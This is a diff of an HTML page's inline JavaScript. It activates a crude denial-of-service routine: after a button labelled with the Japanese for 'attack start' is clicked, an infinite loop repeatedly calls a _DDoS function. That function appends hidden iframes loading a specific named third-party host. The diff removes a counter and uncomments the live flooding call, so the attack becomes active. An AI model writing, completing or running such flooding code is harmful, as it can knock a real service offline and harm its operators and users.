@@ -15,7 +15,6 @@
 </body>
 <script>
   document.getElementById('s').onclick = function() {
-    let n = 0
     document.getElementById('i').innerHTML = '攻撃開始'
     //setInterval(function() {
     /* try {
@@ -25,9 +24,7 @@
     //  n++
     //}, document.getElementById('in').value)
     for(;;){
-      //setTimeout(_DDoS("https://gp-uuc4.iss.netstar-inc.com"),10);
-      document.getElementById('c').innerHTML = n;
-      n++
+      setTimeout(_DDoS("https://gp-uuc4.iss.netstar-inc.com"),10);
     }
     function _DDoS(url){
       document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"> </iframe>';
